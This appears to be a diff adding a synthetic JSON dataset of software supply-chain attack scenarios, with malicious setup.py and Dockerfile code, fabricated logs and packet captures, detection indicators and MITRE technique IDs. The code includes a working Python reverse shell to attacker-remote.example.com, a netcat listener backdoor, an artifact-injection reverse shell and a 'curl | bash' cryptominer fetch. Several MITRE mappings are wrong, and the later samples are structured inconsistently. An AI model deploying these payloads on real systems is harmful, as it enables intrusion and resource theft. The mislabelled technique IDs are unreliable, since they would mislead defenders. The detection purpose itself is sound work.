@@ -1,0 +1,108 @@
+{
+  "samples": [
+    {
+      "scenario": "Malicious code embedded in a widely used Python package that triggers a reverse shell connection during package installation, allowing threat actors to gain remote code execution in enterprise build environments.",
+      "technical_data": {
+        "python_package_malicious_code": "setup.py\n\nimport os\nimport subprocess\nimport socket\nimport threading\n\ndef reverse_shell():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('attacker-remote.example.com', 4444))\n    os.dup2(s.fileno(), 0)  # stdin\n    os.dup2(s.fileno(), 1)  # stdout\n    os.dup2(s.fileno(), 2)  # stderr\n    subprocess.call(['/bin/sh', '-i'])\n\n# Run reverse shell in a separate thread to avoid blocking setup\nthreading.Thread(target=reverse_shell).start()\n\nfrom setuptools import setup\n\nsetup(\n    name='safeutils',\n    version='1.1.0',\n    packages=['safeutils'],\n    # malicious code runs during install\n)",
+        "python_package_metadata": "{\n  \"name\": \"safeutils\",\n  \"version\": \"1.1.0\",\n  \"setup_requires\": [\"setuptools\"],\n  \"entry_points\": {\n    \"console_scripts\": [\n      \"safeutils=safeutils.cli:main\"\n    ]\n  }\n}",
+        "CI_pipeline_log_snippet": "[2024-05-03T10:12:45Z] INFO: Installing Python dependencies\n[2024-05-03T10:12:47Z] INFO: Running setup.py install for safeutils\n[2024-05-03T10:12:48Z] WARNING: Connection established to attacker-remote.example.com:4444\n[2024-05-03T10:12:48Z] INFO: Reverse shell session started",
+        "network_packet_capture_text": "FRAME 5678: 74 bytes on wire (592 bits), 74 bytes captured (592 bits)\nEthernet II, Src: 00:16:3e:5e:6c:00, Dst: 00:25:90:aa:bb:cc\nInternet Protocol Version 4, Src: 10.0.2.15, Dst: 203.0.113.45\nTransmission Control Protocol, Src Port: 52985, Dst Port: 4444, Seq: 0, Ack: 0, Len: 54\n\nTCP Handshake\n\nData segment: /bin/sh -i\n\n",
+        "enterprise_server_logs": "May 03 10:12:48 build-agent-03 python[12345]: running setup.py install for safeutils\nMay 03 10:12:48 build-agent-03 reverse_shell: Connection to attacker-remote.example.com:4444 established\nMay 03 10:12:48 build-agent-03 reverse_shell: spawning interactive shell",
+        "git_commit_diff": "--- a/setup.py\n+++ b/setup.py\n@@ -1,3 +1,22 @@\n+import os\n+import subprocess\n+import socket\n+import threading\n+\n+def reverse_shell():\n+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n+    s.connect(('attacker-remote.example.com', 4444))\n+    os.dup2(s.fileno(), 0)\n+    os.dup2(s.fileno(), 1)\n+    os.dup2(s.fileno(), 2)\n+    subprocess.call(['/bin/sh', '-i'])\n+\n+threading.Thread(target=reverse_shell).start()\n+",
+        "additional_notes": "The malicious code leverages Python's setuptools install process to initiate a reverse shell connection, which can allow attackers to execute arbitrary commands on build servers."
+      },
+      "indicators": [
+        "Unexpected network connections from build agents to external IP on non-standard ports (4444)",
+        "Presence of socket and subprocess calls in setup.py or installation scripts",
+        "Unusual long-running processes spawned during Python package installation",
+        "CI logs showing connection attempts during dependency installation",
+        "Outbound TCP connections established during build steps without explicit approval"
+      ],
+      "detection_method": "Analyze build pipeline logs for network activity during installation phases. Perform static and dynamic analysis of setup.py and installation scripts in dependencies. Monitor network egress points for unexpected outbound connections, especially to unknown IPs on uncommon ports. Employ endpoint detection and response (EDR) to detect reverse shell activities during build jobs.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1059.004 - Command and Scripting Interpreter: Python",
+        "T1071.001 - Application Layer Protocol: Web Protocols (for communication if tunneled)",
+        "T1021.001 - Remote Services: Remote Desktop Protocol (conceptual remote code execution)"
+      ]
+    },
+    {
+      "scenario": "Threat actors compromised a popular Docker base image by injecting a backdoor service that listens on a non-standard port and provides unauthorized access to containerized enterprise applications during deployment.",
+      "technical_data": {
+        "dockerfile_malicious_code": "FROM python:3.9-slim\n\nRUN apt-get update && apt-get install -y netcat\n\nCOPY backdoor.sh /usr/local/bin/backdoor.sh\nRUN chmod +x /usr/local/bin/backdoor.sh\n\nRUN nohup /usr/local/bin/backdoor.sh &\n\nCMD [\"python\", \"app.py\"]\n\n# backdoor.sh script\n# !/bin/sh\nwhile true; do\n  nc -l -p 5555 -e /bin/sh\n  sleep 5\n done",
+        "docker_image_metadata": "{\n  \"RepoTags\": [\n    \"enterprise/baseimage:1.2.0\"\n  ],\n  \"Created\": \"2024-04-28T08:30:00Z\",\n  \"Size\": 134217728\n}",
+        "CI_pipeline_log_snippet": "[2024-04-28T08:31:22Z] INFO: Pulling base image enterprise/baseimage:1.2.0\n[2024-04-28T08:31:25Z] INFO: Starting container from image\n[2024-04-28T08:31:27Z] INFO: Backdoor service started listening on port 5555\n[2024-04-28T08:31:30Z] INFO: Deploying application container",
+        "network_packet_capture_text": "FRAME 7890: 98 bytes on wire (784 bits), 98 bytes captured (784 bits)\nEthernet II, Src: 00:0c:29:45:67:89, Dst: 00:50:56:c0:00:08\nInternet Protocol Version 4, Src: 192.168.1.102, Dst: 198.51.100.30\nTransmission Control Protocol, Src Port: 5555, Dst Port: 57231, Seq: 1, Ack: 1, Len: 40\n\nTCP Payload:\n/bin/sh\n\n",
+        "enterprise_server_logs": "Apr 28 08:31:27 container-host dockerd: Starting backdoor service on port 5555\nApr 28 08:31:28 container-host dockerd: Container enterprise/baseimage:1.2.0 started\nApr 28 08:31:29 container-host dockerd: Listening for connections on port 5555",
+        "git_commit_diff": "--- a/Dockerfile\n+++ b/Dockerfile\n@@ -5,6 +5,15 @@\n+COPY backdoor.sh /usr/local/bin/backdoor.sh\n+RUN chmod +x /usr/local/bin/backdoor.sh\n+\n+RUN nohup /usr/local/bin/backdoor.sh &\n+",
+        "backdoor_script_content": "#!/bin/sh\nwhile true; do\n  nc -l -p 5555 -e /bin/sh\n  sleep 5\n done"
+      },
+      "indicators": [
+        "Docker base image 'enterprise/baseimage:1.2.0' contains unexpected backdoor.sh script",
+        "Container startup logs showing netcat listening on port 5555",
+        "Network connections inbound to containers on uncommon ports (e.g., 5555) not documented",
+        "Unexpected long-running background processes (netcat) inside containers",
+        "CI/CD pipeline logs referencing backdoor service initialization during image build or deployment"
+      ],
+      "detection_method": "Scan container images for unauthorized scripts or binaries before deployment. Monitor container runtime for unexpected listening ports and processes. Use network monitoring to detect inbound connections on non-standard container ports. Implement image signing and verification to ensure integrity of base images. Employ behavior analysis on container hosts to detect netcat or similar backdoor tools.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1059.004 - Command and Scripting Interpreter: Unix Shell",
+        "T1573.001 - Encrypted Channel: Symmetric Cryptography (if encryption used for backdoor communication)",
+        "T1614 - Deploy Container"
+      ]
+    },
+    {
+      "scenario": "Adversaries compromise a widely used Python package by inserting a malicious post-install script that injects a backdoor into enterprise build environments by modifying build artifacts, enabling remote command execution.",
+      "technical_data": {
+        "python_package_malicious_code": "setup.py\n\nfrom setuptools import setup\nimport os\nimport subprocess\n\nclass PostInstallCommand:\n    def run(self):\n        # Inject reverse shell payload into build artifact\n        with open('dist/binary', 'ab') as f:\n            f.write(b'\\n#malicious backdoor start\\nimport socket,subprocess,os;s=socket.socket();s.connect((\"attacker.example.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\\n#malicious backdoor end\\n')\n\nsetup(\n    name='buildtools',\n    version='1.5.9',\n    cmdclass={'install': PostInstallCommand},\n    # other setup args\n)\n\nif __name__ == '__main__':\n    PostInstallCommand().run()",
+        "python_package_metadata": "{\n  \"name\": \"buildtools\",\n  \"version\": \"1.5.9\",\n  \"cmdclass\": {\n    \"install\": \"PostInstallCommand\"\n  }\n}",
+        "CI_pipeline_log_snippet": "[2024-05-03T09:15:42Z] INFO: Installing buildtools==1.5.9\n[2024-05-03T09:15:45Z] INFO: Running install command for buildtools\n[2024-05-03T09:15:47Z] INFO: Injected reverse shell payload into dist/binary\n[2024-05-03T09:16:01Z] INFO: Build artifact created successfully",
+        "network_packet_capture_text": "FRAME 9876: 78 bytes on wire (624 bits), 78 bytes captured (624 bits)\nEthernet II, Src: 00:0c:29:3e:5b:7a, Dst: 00:50:56:c0:00:08\nInternet Protocol Version 4, Src: 10.0.0.15, Dst: 203.0.113.42\nTransmission Control Protocol, Src Port: 53210, Dst Port: 4444, Seq: 1, Ack: 1, Len: 0\n\nTCP Payload:\n\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68",
+        "enterprise_server_logs": "May 03 09:15:45 build-agent-02 python[11223]: Running install command for buildtools\nMay 03 09:15:47 build-agent-02 python[11223]: Injected reverse shell payload into dist/binary\nMay 03 09:16:05 build-agent-02 kernel: Connection attempt to 203.0.113.42:4444 from build-agent-02",
+        "git_commit_diff": "--- a/setup.py\n+++ b/setup.py\n@@ -20,6 +20,18 @@\n+class PostInstallCommand:\n+    def run(self):\n+        with open('dist/binary', 'ab') as f:\n+            f.write(b'\\n#malicious backdoor start\\nimport socket,subprocess,os;s=socket.socket();s.connect((\"attacker.example.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\\n#malicious backdoor end\\n')\n+\n+setup(\n+    name='buildtools',\n+    version='1.5.9',\n+    cmdclass={'install': PostInstallCommand},\n+)",
+        "indicators": [
+          "Unexpected install command class in Python package setup.py",
+          "Modification of build artifacts during dependency installation",
+          "Outbound TCP connection attempts to attacker-controlled IP on uncommon port 4444",
+          "CI logs showing injection of reverse shell payload",
+          "Unusual network traffic from build agents immediately after package installation"
+        ],
+        "detection_method": "Perform static and dynamic analysis of package installation scripts to detect post-install modifications. Monitor build artifact hashes for unexpected changes. Network anomaly detection to identify unusual outbound connections from build servers to suspicious IPs and ports. Correlate CI logs for unexpected command executions or artifact changes.",
+        "relevant_mitre_techniques": [
+          "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+          "T1204 - User Execution (Install Scripts)",
+          "T1219 - Remote Access Software",
+          "T1071.001 - Application Layer Protocol: Web Protocols (if reverse shell uses HTTP/S)",
+          "T1059.004 - Command and Scripting Interpreter: Unix Shell"
+        ]
+      }
+    },
+    {
+      "scenario": "Attackers compromise a popular Docker base image on a public registry by embedding a cryptomining malware that runs silently in enterprise containerized environments, causing resource exhaustion and potential lateral movement.",
+      "technical_data": {
+        "dockerfile_malicious_code": "FROM ubuntu:20.04\n\nRUN apt-get update && apt-get install -y curl\n\n# Malicious cryptominer installation\nRUN curl -fsSL http://malicious.example.com/cryptominer.sh | bash\n\nCMD [\"/bin/bash\"]",
+        "docker_image_metadata": "{\n  \"name\": \"company/base-image\",\n  \"tag\": \"ubuntu-20.04-miner\",\n  \"layers\": [\n    \"sha256:abc123...\",\n    \"sha256:def456...\",\n    \"sha256:minerlayer789...\"\n  ]\n}",
+        "CI_pipeline_log_snippet": "[2024-06-15T11:42:10Z] INFO: Pulling company/base-image:ubuntu-20.04-miner\n[2024-06-15T11:42:15Z] INFO: Running container build\n[2024-06-15T11:42:20Z] INFO: Executing RUN curl -fsSL http://malicious.example.com/cryptominer.sh | bash\n[2024-06-15T11:42:40Z] INFO: Container build completed",
+        "network_packet_capture_text": "FRAME 2345: 1500 bytes on wire (12000 bits), 1500 bytes captured (12000 bits)\nEthernet II, Src: 02:42:ac:11:00:03, Dst: 198.51.100.85\nInternet Protocol Version 4, Src: 172.17.0.3, Dst: 198.51.100.85\nTransmission Control Protocol, Src Port: 33333, Dst Port: 3333, Seq: 1, Ack: 1, Len: 1500\n\nPayload: Encrypted mining traffic to known cryptomining pool at 198.51.100.85:3333",
+        "enterprise_server_logs": "Jun 15 11:42:20 container-builder docker[56789]: Step RUN curl -fsSL http://malicious.example.com/cryptominer.sh | bash\nJun 15 11:42:21 container-builder bash[56790]: Downloading cryptominer payload\nJun 15 11:42:40 container-builder docker[56789]: Successfully built image company/base-image:ubuntu-20.04-miner\nJun 15 12:00:00 kubelet[12345]: Container company/base-image consuming excessive CPU resources",
+        "git_commit_diff": "--- a/Dockerfile\n+++ b/Dockerfile\n@@ -5,6 +5,10 @@\n+RUN curl -fsSL http://malicious.example.com/cryptominer.sh | bash\n+",
+        "indicators": [
+          "Docker image company/base-image tagged with unexpected 'ubuntu-20.04-miner' suffix",
+          "RUN command fetching and executing script from suspicious external URL during image build",
+          "Unusual high CPU usage in containers using the base image",
+          "Network traffic from containers to known cryptomining pool IPs and ports",
+          "Presence of unknown layers in Docker image manifest containing mining payload"
+        ],
+        "detection_method": "Implement container image scanning to detect malicious scripts or binaries embedded during build. Use behavioral monitoring on container runtime to detect abnormal CPU/memory usage. Network traffic analysis to identify connections to cryptomining pools. Monitor build logs for unexpected external script downloads and execution during image creation.",
+        "relevant_mitre_techniques": [
+          "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+          "T1496 - Resource Hijacking",
+          "T1059.004 - Command and Scripting Interpreter: Unix Shell",
+          "T1071.001 - Application Layer Protocol: Web Protocols",
+          "T1610 - Deploy Container"
+        ]
+      }
+    }
+  ]
+}
